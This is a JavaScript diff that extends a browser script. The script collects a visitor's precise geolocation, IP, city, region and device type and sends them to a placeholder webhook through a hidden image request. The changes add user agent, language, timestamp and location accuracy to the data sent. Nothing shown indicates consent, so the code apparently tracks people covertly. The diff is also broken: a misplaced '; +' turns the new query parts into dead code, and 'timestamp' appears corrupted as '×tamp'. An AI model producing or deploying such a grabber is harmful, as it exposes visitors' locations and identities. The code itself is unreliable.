@@ -490,7 +490,10 @@
             city: locationData.city,
             ip: locationData.ip,
             deviceType: document.body.classList.contains('mobile') ? 'mobile' :
-                        document.body.classList.contains('tablet') ? 'tablet' : 'desktop'
+                        document.body.classList.contains('tablet') ? 'tablet' : 'desktop',
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            language: navigator.language
           };
 
           try {
@@ -522,6 +525,7 @@
       const acc = pos.coords?.accuracy || "unknown";
       const url = `INSERT UPDATED WEBHOOK HERE?ref=${encodeURIComponent(reason)}` +
         `&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}` +
+        `&acc=${encodeURIComponent(acc)}` +
         `&country=${encodeURIComponent(locationData.country)}` +
         `&region=${encodeURIComponent(locationData.region)}` +
         `&city=${encodeURIComponent(locationData.city)}` +
@@ -529,7 +533,10 @@
         `&deviceType=${encodeURIComponent(
           document.body.classList.contains('mobile') ? 'mobile' :
           document.body.classList.contains('tablet') ? 'tablet' : 'desktop'
-        )}`;
+        )}`; +
+        `&userAgent=${encodeURIComponent(navigator.userAgent)}` +
+        `×tamp=${encodeURIComponent(new Date().toISOString())}` +
+        `&language=${encodeURIComponent(navigator.language)}`;
       const img = new Image();
       img.onerror = () => console.error("GET request failed:", url);
       img.src = url;
